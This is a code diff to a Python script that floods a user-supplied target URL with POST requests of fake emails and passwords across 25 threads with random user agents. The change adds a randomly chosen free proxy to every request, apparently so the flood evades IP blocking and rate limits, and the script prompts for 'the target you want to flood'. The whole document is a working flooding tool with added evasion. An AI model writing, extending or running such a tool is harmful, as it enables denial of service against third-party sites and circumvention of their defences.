@@ -1,6 +1,7 @@
 import threading
 import requests
 import random
+from fp.fp import FreeProxy
 
 from fake_useragent import UserAgent
 from faker import Faker
@@ -25,6 +26,9 @@ def generate_random_email():
 def generate_random_password():
     return fake.password() 
 
+def generate_proxy():
+    return FreeProxy(rand=True).get()
+
 def send_posts(url):
     while True:
         email = generate_random_email()
@@ -33,11 +37,13 @@ def send_posts(url):
         ua = UserAgent()
         user_agent = ua.random
         headers = {'User-Agent': user_agent}
-        response = requests.post(url, data=data, headers=headers,)
-        print(f"Email: {email}, Password: {password}, Status Code: {response.status_code}, headers: {user_agent}")
+        proxy = generate_proxy()
+        response = requests.post(url, data=data, headers=headers, proxies={"http": proxy, "https": proxy})
+        print(f"Email: {email}, Password: {password}, Status Code: {response.status_code}, headers: {user_agent}, proxy: {proxy}")
 
 def main():
     url = input("Enter the URL of the target you want to flood: ")
+
     threads = [threading.Thread(target=send_posts, args=(url,), daemon=True) for _ in range(25)]
 
     for t in threads:
